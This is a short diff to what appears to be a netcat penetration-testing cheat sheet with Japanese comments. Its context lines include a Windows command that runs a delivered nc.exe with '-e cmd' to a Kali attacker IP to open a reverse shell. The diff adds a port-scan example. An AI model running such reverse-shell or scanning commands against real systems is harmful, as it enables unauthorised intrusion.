@@ -8,3 +8,6 @@ nc <IP> <port> > example.txt #ファイル受信側
 
 //windows
 cmd.exe /c C:\Windows\Temp\nc.exe <kali IP> <port> -e cmd #配送したncをcmdで実行してシェル
+
+//ポートスキャン
+nc -z <IP> 10-100 #１０番から１００番ポートを調べる例
